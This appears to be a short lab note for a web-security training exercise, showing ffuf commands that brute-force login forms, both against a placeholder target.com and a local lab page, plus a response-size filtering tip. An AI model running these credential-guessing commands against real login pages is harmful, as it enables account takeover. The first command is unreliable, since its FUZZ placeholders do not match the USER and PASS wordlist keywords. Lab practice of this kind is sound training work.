### Brute Force Attack Lab --- 1  ( Authentication 0x01 )

-  Can you Burp Suite Intruder for this, but i am using `ffuf` tool, because its faster.
#### FFUF usage for brute forcing both user and pass

```shell
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=FUZZ" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER \
  -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:PASS \
  -mode clusterbomb
```
#### What is used in the lab 

```Markdown
# Steps

1. ffuf -u http://localhost.com/labs/a0x01.php -X POST -d "username=jeremy&password=FUZZ" -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt -mode clusterbomb

2. Let it run for few seconds and then stop it, reason : " filter out the size since we are getting same size " --> use " -fs 1814 " to filter that size out while brute forcing.
